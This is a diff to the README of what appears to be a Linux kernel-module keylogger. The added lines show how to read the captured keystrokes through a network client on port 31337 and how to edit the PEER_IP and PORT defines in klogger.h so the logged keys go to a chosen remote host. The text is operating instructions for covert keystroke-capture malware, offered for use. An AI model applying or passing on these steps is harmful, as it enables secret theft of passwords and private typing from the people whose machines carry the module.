@@ -38,6 +38,20 @@ $ sudo ./klg_unload.sh  # you need root permission
 ### How to see Keyloger file
 ```sh
 $ cat /dev/klg
+       or
+$ ./test/example/client.py localhost 31337
+```
+
+### How to change accept_ip & port
+edit key-logger/klogger.h
+```c
+#define PEER_IP   "127.0.0.1"
+#define PORT      "31337"
+```
+to
+```c
+#define PEER_IP  "IPNUMBER"
+#define PORT     "PORTNUMBER"
 ```
 
 ### How to see Kernel Log file
